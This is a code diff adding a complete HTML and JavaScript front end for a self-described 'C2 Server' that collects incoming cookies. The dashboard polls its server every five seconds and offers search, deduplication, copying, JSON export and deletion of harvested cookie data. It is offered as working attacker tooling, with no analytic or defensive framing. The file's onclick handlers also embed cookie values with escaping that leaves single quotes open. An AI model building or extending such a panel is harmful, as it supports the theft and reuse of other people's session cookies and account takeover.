@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>C2 Server - Cookie Management</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="dashboard">
+      <!-- Sidebar -->
+      <aside class="sidebar">
+        <div class="sidebar-header">
+          <div class="logo">
+            <i class="fas fa-server"></i>
+            <span>C2 Server</span>
+          </div>
+        </div>
+        <nav class="sidebar-nav">
+          <a href="/" class="nav-item active">
+            <i class="fas fa-cookie-bite"></i>
+            <span>Cookies</span>
+          </a>
+          <a href="/analytics.html" class="nav-item">
+            <i class="fas fa-chart-line"></i>
+            <span>Analytics</span>
+          </a>
+          <a href="#" class="nav-item">
+            <i class="fas fa-cog"></i>
+            <span>Settings</span>
+          </a>
+        </nav>
+        <div class="sidebar-footer">
+          <div class="status-indicator">
+            <span class="status-dot active"></span>
+            <span>Server Online</span>
+          </div>
+        </div>
+      </aside>
+
+      <!-- Main Content -->
+      <main class="main-content">
+        <!-- Header -->
+        <header class="top-header">
+          <div class="header-left">
+            <h1>Cookie Management Dashboard</h1>
+            <p class="subtitle">Real-time cookie monitoring & control</p>
+          </div>
+          <div class="header-right">
+            <div class="header-stats">
+              <div class="stat-card">
+                <div class="stat-icon">
+                  <i class="fas fa-database"></i>
+                </div>
+                <div class="stat-info">
+                  <span class="stat-value" id="totalCookies">0</span>
+                  <span class="stat-label">Total Cookies</span>
+                </div>
+              </div>
+              <div class="stat-card">
+                <div class="stat-icon">
+                  <i class="fas fa-clock"></i>
+                </div>
+                <div class="stat-info">
+                  <span class="stat-value" id="lastUpdate">--:--</span>
+                  <span class="stat-label">Last Update</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </header>
+
+        <!-- Toolbar -->
+        <div class="toolbar">
+          <div class="toolbar-left">
+            <div class="search-box">
+              <i class="fas fa-search"></i>
+              <input
+                type="text"
+                id="searchInput"
+                placeholder="Search cookies..."
+              />
+            </div>
+            <button class="btn btn-secondary" id="clearBtn">
+              <i class="fas fa-trash"></i> Clear All
+            </button>
+            <div class="toggle-group">
+              <label class="toggle-label">
+                <input type="checkbox" id="hideDuplicates" />
+                <span class="toggle-slider"></span>
+                <span class="toggle-text">
+                  <i class="fas fa-filter"></i> Hide Duplicates
+                </span>
+              </label>
+            </div>
+          </div>
+          <div class="toolbar-right">
+            <button class="btn btn-primary" id="exportBtn">
+              <i class="fas fa-download"></i> Export
+            </button>
+            <button class="btn btn-secondary" id="refreshBtn">
+              <i class="fas fa-sync-alt"></i> Refresh
+            </button>
+          </div>
+        </div>
+
+        <!-- Cookie Table -->
+        <div class="table-container">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>
+                  <input type="checkbox" id="selectAll" />
+                </th>
+                <th>ID</th>
+                <th>Cookie Data</th>
+                <th>Timestamp</th>
+                <th>Status</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="cookieTableBody">
+              <tr class="empty-row">
+                <td colspan="6">
+                  <div class="empty-state">
+                    <i class="fas fa-inbox"></i>
+                    <p>No cookies received yet</p>
+                    <span>Waiting for incoming data...</span>
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- Footer Stats -->
+        <footer class="footer-stats">
+          <div class="footer-stat">
+            <span class="footer-label">Server Uptime:</span>
+            <span class="footer-value" id="uptime">00:00:00</span>
+          </div>
+          <div class="footer-stat">
+            <span class="footer-label">Port:</span>
+            <span class="footer-value">3000</span>
+          </div>
+          <div class="footer-stat">
+            <span class="footer-label">Version:</span>
+            <span class="footer-value">v1.0.0</span>
+          </div>
+        </footer>
+      </main>
+    </div>
+
+    <script>
+      let cookies = [];
+      let startTime = Date.now();
+      let autoRefreshInterval;
+
+      // Initialize
+      document.addEventListener("DOMContentLoaded", function () {
+        loadCookies();
+        setupEventListeners();
+        startAutoRefresh();
+        updateUptime();
+        setInterval(updateUptime, 1000);
+      });
+
+      // Load cookies from server
+      function loadCookies() {
+        fetch("/get-cookie-names")
+          .then((response) => response.json())
+          .then((data) => {
+            // Map data to cookie objects with timestamps
+            cookies = data.map((cookieData, index) => ({
+              id: index + 1,
+              data: cookieData,
+              timestamp: new Date().toISOString(), // Fallback timestamp
+            }));
+            renderTable();
+            updateStats();
+          })
+          .catch((error) => {
+            console.error("Error loading cookies:", error);
+            showError("Failed to load cookies");
+          });
+      }
+
+      // Render table
+      function renderTable() {
+        const tbody = document.getElementById("cookieTableBody");
+        const searchTerm = document
+          .getElementById("searchInput")
+          .value.toLowerCase();
+        const hideDuplicates =
+          document.getElementById("hideDuplicates").checked;
+
+        let filteredCookies = cookies;
+
+        // Filter duplicates if enabled
+        if (hideDuplicates) {
+          const seen = new Set();
+          filteredCookies = filteredCookies.filter((cookie) => {
+            if (seen.has(cookie.data)) {
+              return false;
+            }
+            seen.add(cookie.data);
+            return true;
+          });
+        }
+
+        // Filter by search term
+        if (searchTerm) {
+          filteredCookies = filteredCookies.filter((cookie) =>
+            cookie.data.toLowerCase().includes(searchTerm)
+          );
+        }
+
+        if (filteredCookies.length === 0) {
+          tbody.innerHTML = `
+            <tr class="empty-row">
+              <td colspan="6">
+                <div class="empty-state">
+                  <i class="fas fa-search"></i>
+                  <p>No cookies found</p>
+                  <span>Try adjusting your search</span>
+                </div>
+              </td>
+            </tr>
+          `;
+          return;
+        }
+
+        tbody.innerHTML = filteredCookies
+          .map(
+            (cookie, index) => `
+          <tr>
+            <td>
+              <input type="checkbox" class="row-checkbox" data-id="${
+                cookie.id
+              }" />
+            </td>
+            <td class="id-cell">#${cookie.id}</td>
+            <td class="data-cell">
+              <div class="cookie-data">
+                <code>${escapeHtml(cookie.data)}</code>
+                <button class="copy-btn" onclick="copyToClipboard('${escapeHtml(
+                  cookie.data
+                )}')" title="Copy">
+                  <i class="fas fa-copy"></i>
+                </button>
+              </div>
+            </td>
+            <td class="timestamp-cell">
+              <i class="fas fa-clock"></i>
+              ${formatTimestamp(cookie.timestamp)}
+            </td>
+            <td>
+              <span class="status-badge active">
+                <span class="status-dot"></span>
+                Active
+              </span>
+            </td>
+            <td class="actions-cell">
+              <button class="action-btn" onclick="viewCookie(${index})" title="View">
+                <i class="fas fa-eye"></i>
+              </button>
+              <button class="action-btn delete" onclick="deleteCookie(${index})" title="Delete">
+                <i class="fas fa-trash"></i>
+              </button>
+            </td>
+          </tr>
+        `
+          )
+          .join("");
+      }
+
+      // Update statistics
+      function updateStats() {
+        const hideDuplicates =
+          document.getElementById("hideDuplicates").checked;
+        let displayCount = cookies.length;
+
+        if (hideDuplicates) {
+          const uniqueCookies = new Set(cookies.map((c) => c.data));
+          displayCount = uniqueCookies.size;
+        }
+
+        document.getElementById("totalCookies").textContent = displayCount;
+        if (cookies.length > 0) {
+          const lastCookie = cookies[cookies.length - 1];
+          document.getElementById("lastUpdate").textContent = formatTime(
+            new Date(lastCookie.timestamp)
+          );
+        }
+      }
+
+      // Setup event listeners
+      function setupEventListeners() {
+        // Search
+        document
+          .getElementById("searchInput")
+          .addEventListener("input", renderTable);
+
+        // Hide duplicates toggle
+        document
+          .getElementById("hideDuplicates")
+          .addEventListener("change", function () {
+            renderTable();
+            updateStats();
+            // Save preference to localStorage
+            localStorage.setItem("hideDuplicates", this.checked);
+          });
+
+        // Load saved preference
+        const savedPreference = localStorage.getItem("hideDuplicates");
+        if (savedPreference === "true") {
+          document.getElementById("hideDuplicates").checked = true;
+        }
+
+        // Refresh
+        document.getElementById("refreshBtn").addEventListener("click", () => {
+          loadCookies();
+          showNotification("Data refreshed", "success");
+        });
+
+        // Clear all
+        document.getElementById("clearBtn").addEventListener("click", () => {
+          if (confirm("Are you sure you want to clear all cookies?")) {
+            clearAllCookies();
+          }
+        });
+
+        // Export
+        document
+          .getElementById("exportBtn")
+          .addEventListener("click", exportData);
+
+        // Select all
+        document
+          .getElementById("selectAll")
+          .addEventListener("change", function (e) {
+            const checkboxes = document.querySelectorAll(".row-checkbox");
+            checkboxes.forEach((cb) => (cb.checked = e.target.checked));
+          });
+      }
+
+      // Clear all cookies
+      function clearAllCookies() {
+        fetch("/clear-cookies", { method: "POST" })
+          .then(() => {
+            cookies = [];
+            renderTable();
+            updateStats();
+            showNotification("All cookies cleared", "success");
+          })
+          .catch((error) => {
+            console.error("Error clearing cookies:", error);
+            showNotification("Failed to clear cookies", "error");
+          });
+      }
+
+      // Delete single cookie
+      function deleteCookie(index) {
+        if (confirm("Delete this cookie?")) {
+          cookies.splice(index, 1);
+          renderTable();
+          updateStats();
+          showNotification("Cookie deleted", "success");
+        }
+      }
+
+      // View cookie details
+      function viewCookie(index) {
+        const cookie = cookies[index];
+        alert(
+          `Cookie Details:\n\n${cookie.data}\n\nTimestamp: ${formatTimestamp(
+            cookie.timestamp
+          )}`
+        );
+      }
+
+      // Copy to clipboard
+      function copyToClipboard(text) {
+        navigator.clipboard.writeText(text).then(() => {
+          showNotification("Copied to clipboard", "success");
+        });
+      }
+
+      // Export data
+      function exportData() {
+        const dataStr = JSON.stringify(cookies, null, 2);
+        const dataBlob = new Blob([dataStr], { type: "application/json" });
+        const url = URL.createObjectURL(dataBlob);
+        const link = document.createElement("a");
+        link.href = url;
+        link.download = `cookies_${new Date().toISOString()}.json`;
+        link.click();
+        URL.revokeObjectURL(url);
+        showNotification("Data exported", "success");
+      }
+
+      // Auto refresh
+      function startAutoRefresh() {
+        autoRefreshInterval = setInterval(() => {
+          loadCookies();
+        }, 5000); // Refresh every 5 seconds
+      }
+
+      // Update uptime
+      function updateUptime() {
+        const elapsed = Date.now() - startTime;
+        const hours = Math.floor(elapsed / 3600000);
+        const minutes = Math.floor((elapsed % 3600000) / 60000);
+        const seconds = Math.floor((elapsed % 60000) / 1000);
+        document.getElementById("uptime").textContent = `${String(
+          hours
+        ).padStart(2, "0")}:${String(minutes).padStart(2, "0")}:${String(
+          seconds
+        ).padStart(2, "0")}`;
+      }
+
+      // Format timestamp
+      function formatTimestamp(timestamp) {
+        const date = new Date(timestamp);
+        return date.toLocaleString("vi-VN", {
+          year: "numeric",
+          month: "2-digit",
+          day: "2-digit",
+          hour: "2-digit",
+          minute: "2-digit",
+          second: "2-digit",
+        });
+      }
+
+      // Format time
+      function formatTime(date) {
+        return date.toLocaleTimeString("vi-VN", {
+          hour: "2-digit",
+          minute: "2-digit",
+          second: "2-digit",
+        });
+      }
+
+      // Escape HTML
+      function escapeHtml(text) {
+        const div = document.createElement("div");
+        div.textContent = text;
+        return div.innerHTML;
+      }
+
+      // Show notification
+      function showNotification(message, type = "info") {
+        const notification = document.createElement("div");
+        notification.className = `notification ${type}`;
+        notification.innerHTML = `
+          <i class="fas fa-${
+            type === "success"
+              ? "check-circle"
+              : type === "error"
+              ? "exclamation-circle"
+              : "info-circle"
+          }"></i>
+          <span>${message}</span>
+        `;
+        document.body.appendChild(notification);
+        setTimeout(() => {
+          notification.classList.add("show");
+        }, 10);
+        setTimeout(() => {
+          notification.classList.remove("show");
+          setTimeout(() => notification.remove(), 300);
+        }, 3000);
+      }
+
+      // Show error
+      function showError(message) {
+        showNotification(message, "error");
+      }
+    </script>
+  </body>
+</html>
